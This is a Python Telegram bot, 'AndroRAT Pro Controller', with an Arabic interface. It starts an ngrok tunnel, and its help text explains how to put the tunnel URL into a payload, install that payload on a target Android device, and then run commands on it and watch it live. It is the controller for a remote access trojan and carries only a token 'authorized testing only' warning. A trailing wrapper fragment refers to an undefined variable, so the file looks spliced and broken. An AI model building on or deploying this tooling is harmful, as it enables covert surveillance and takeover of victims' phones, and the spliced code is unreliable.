
# إنشاء نسخة نظيفة تماماً بدون أخطاء

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🤖 AndroRAT Pro Controller Bot for Termux
"""

import logging
import os
import sys
import subprocess
import json
import time
from pathlib import Path

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes
from dotenv import load_dotenv
# التوقيع المطلوب
SIGNATURE = "\\n\\n> _*{•••♕آلَشـبّــ💀ـح.sx•••}*_"

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)
# تحميل ملف البيئة
load_dotenv()
# الإعدادات
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
AUTHORIZED_USERS = []
users_str = os.getenv("AUTHORIZED_USERS", "")
if users_str:
    try:
        AUTHORIZED_USERS = [int(x.strip()) for x in users_str.split(",") if x.strip()]
    except:
        pass

NGROK_TOKEN = os.getenv("NGROK_AUTH_TOKEN", "")
ngrok_process = None
ngrok_url = None

def is_auth(user_id):
    return user_id in AUTHORIZED_USERS

def add_signature(text):
    """إضافة التوقيع للرسالة"""
    return text + SIGNATURE

def get_main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 إدارة Ngrok", callback_data='ngrok')],
        [InlineKeyboardButton("📱 الأجهزة", callback_data='devices')],
        [InlineKeyboardButton("📊 الحالة", callback_data='status')],
        [InlineKeyboardButton("❓ المساعدة", callback_data='help')],
    ])

def get_ngrok_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("▶️ تشغيل Ngrok", callback_data='start_ngrok'),
         InlineKeyboardButton("⏹️ إيقاف Ngrok", callback_data='stop_ngrok')],
        [InlineKeyboardButton("📋 نسخ الرابط", callback_data='copy_url')],
        [InlineKeyboardButton("🔙 رجوع", callback_data='back')],
    ])

def get_back_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data='back')]
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not is_auth(user.id):
        await update.message.reply_text(add_signature("⛔ عذراً، أنت غير مصرح لك باستخدام هذا البوت."))
        return
    
    text = f"""🤖 <b>AndroRAT Pro Controller</b>

👋 أهلاً بك <b>{user.first_name}</b>!

📋 <b>القائمة الرئيسية:</b>
اختر من الأزرار أدنا:"""
    
    await update.message.reply_html(
        add_signature(text),
        reply_markup=get_main_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global ngrok_process, ngrok_url
    
    query = update.callback_query
    await query.answer()
    
    if not is_auth(query.from_user.id):
        await query.edit_message_text(add_signature("⛔ أنت غير مصرح لك."))
        return
    
    data = query.data
    
    if data == 'back':
        text = """🤖 <b>AndroRAT Pro Controller</b>

📋 <b>القائمة الرئيسية</b>

اختر الخيار المطلوب:"""
        await query.edit_message_text(
            add_signature(text),
            parse_mode='HTML',
            reply_markup=get_main_keyboard()
        )
    
    elif data == 'ngrok':
        status = "🟢 متصل" if (ngrok_process and ngrok_process.poll() is None) else "🔴 غير متصل"
        url = ngrok_url or "غير متوفر"
        
        text = f"""🌐 <b>إدارة Ngrok</b>

الحالة: {status}
الرابط: <code>{url}</code>

اختر الإجراء:"""
        
        await query.edit_message_text(
            add_signature(text),
            parse_mode='HTML',
            reply_markup=get_ngrok_keyboard()
        )
    
    elif data == 'start_ngrok':
        await query.edit_message_text(add_signature("⏳ جاري تشغيل Ngrok..."))
        
        try:
            # إضافة التوكن إذا موجود
            if NGROK_TOKEN:
                subprocess.run(
                    ["ngrok", "config", "add-authtoken", NGROK_TOKEN],
                    capture_output=True,
                    timeout=10
                )
            
            # تشغيل Ngrok
            ngrok_process = subprocess.Popen(
                ["ngrok", "http", "8080", "--region", "us"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # انتظار التشغيل
            time.sleep(5)
            
            # محاولة الحصول على الرابط
            try:
                import urllib.request
                req = urllib.request.Request("http://127.0.0.1:4040/api/tunnels")
                with urllib.request.urlopen(req, timeout=5) as response:
                    data = json.loads(response.read().decode())
                    if data.get("tunnels"):
                        ngrok_url = data["tunnels"][0]["public_url"]
            except Exception as e:
                logger.error(f"Failed to get URL: {e}")
                ngrok_url = "جاري الإعداد..."
            
            if ngrok_url and ngrok_url != "جاري الإعداد...":
                text = f"""✅ <b>تم تشغيل Ngrok بنجاح!</b>

🔗 <b>الرابط العام:</b>
<code>{ngrok_url}</code>

💡 استخدم هذا الرابط في إعدادات Payload"""
            else:
                text = """⚠️ <b>جاري الإعداد...</b>

قد يستغرق الأمر بضع ثوانٍ.

تحقق من الحالة لاحقاً."""
            
            await query.edit_message_text(
                add_signature(text),
                parse_mode='HTML',
                reply_markup=get_ngrok_keyboard()
            )
            
        except Exception as e:
            error_text = f"""❌ <b>فشل تشغيل Ngrok</b>

الخطأ: {str(e)}

🔧 <b>الحلول المحتملة:</b>
• تأكد من تثبيت Ngrok
• تأكد من صحة التوكن
• تأكد من الاتصال بالإنترنت"""
            
            await query.edit_message_text(
                add_signature(error_text),
                parse_mode='HTML',
                reply_markup=get_ngrok_keyboard()
            )
    
    elif data == 'stop_ngrok':
        if ngrok_process:
            ngrok_process.terminate()
            try:
                ngrok_process.wait(timeout=3)
            except:
                ngrok_process.kill()
            ngrok_process = None
            ngrok_url = None
        
        await query.edit_message_text(
            add_signature("⏹️ <b>تم إيقاف Ngrok</b>"),
            parse_mode='HTML',
            reply_markup=get_ngrok_keyboard()
        )
    
    elif data == 'copy_url':
        if ngrok_url and ngrok_url != "جاري الإعداد...":
            await query.answer(f"الرابط: {ngrok_url}", show_alert=True)
        else:
            await query.answer("لا يوجد رابط نشط!", show_alert=True)
    
    elif data == 'devices':
        text = """📱 <b>إدارة الأجهزة</b>

📝 <b>الميزات المتاحة:</b>
• عرض الأجهزة المتصلة
• التحكم في الجهاز
• تنفيذ أوامر
• مراقبة حية

⚠️ <b>ملاحظة:</b>
يجب إعداد Control Server أولاً."""
        
        await query.edit_message_text(
            add_signature(text),
            parse_mode='HTML',
            reply_markup=get_back_keyboard()
        )
    
    elif data == 'status':
        ngrok_status = "🟢 متصل" if (ngrok_process and ngrok_process.poll() is None) else "🔴 غير متصل"
        url = ngrok_url or "غير متوفر"
        
        text = f"""📊 <b>حالة النظام</b>

🌐 <b>Ngrok:</b>
• الحالة: {ngrok_status}
• الرابط: <code>{url}</code>

📱 <b>الأجهزة:</b>
• غير متصل بـ Control Server

⏰ <b>الوقت:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}"""
        
        await query.edit_message_text(
            add_signature(text),
            parse_mode='HTML',
            reply_markup=get_back_keyboard()
        )
    
    elif data == 'help':
        text = """📖 <b>دليل الاستخدام</b>

🚀 <b>البدء السريع:</b>

1️⃣ <b>إعداد Ngrok:</b>
• اضغط "🌐 إدارة Ngrok"
• اضغط "▶️ تشغيل Ngrok"
• انتظر حتى يظهر الرابط
• انسخ الرابط

2️⃣ <b>إنشاء Payload:</b>
• استخدم الرابط في إعدادات البايلود
• صيغة: <code>xxx.ngrok.io:443</code>
• ثبت البايلود على الجهاز المستهدف

3️⃣ <b>التحكم:</b>
• انتظر اتصال الجهاز
• اختر الجهاز من القائمة
• استخدم الأزرار للتحكم

⚠️ <b>تحذير:</b>
هذا البوت للاختبار المصرح به فقط!"""
        
        await query.edit_message_text(
            add_signature(text),
            parse_mode='HTML',
            reply_markup=get_back_keyboard()
        )

def main():
    if not BOT_TOKEN:
        print("❌ خطأ: لم يتم تعيين TELEGRAM_BOT_TOKEN")
        print("أنشئ ملف .env وأضف:")
        print("TELEGRAM_BOT_TOKEN=توكنك_هنا")
        print("AUTHORIZED_USERS=معرفك_هنا")
        return
    
    print("""
    ╔══════════════════════════════════════╗
    ║  🤖 AndroRAT Pro Controller          ║
    ║  جاري التشغيل...                     ║
    ╚══════════════════════════════════════╝
    """)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("✅ البوت يعمل الآن!")
    app.run_polling()

if __name__ == "__main__":
    main()


# حفظ الملف
with open('/mnt/kimi/output/andro_rat_pro_bot.py', 'w', encoding='utf-8') as f:
    f.write(fixed_code)

print("✅ تم إصلاح الملف بنجاح!")
print(f"📊 الحجم: {len(fixed_code)} حرف")

# التحقق
with open('andro_rat_pro_bot_output.py', 'r') as f:
    content = f.read()
    
print("\n🔍 التحقق:")
print(f"✓ السطر 253: {content.split(chr(10))[252][:50]}...")
print(f"✓ عدد الأسطر: {len(content.split(chr(10)))}")
print(f"✓ يحتوي على SIGNATURE: {'SIGNATURE' in content}")
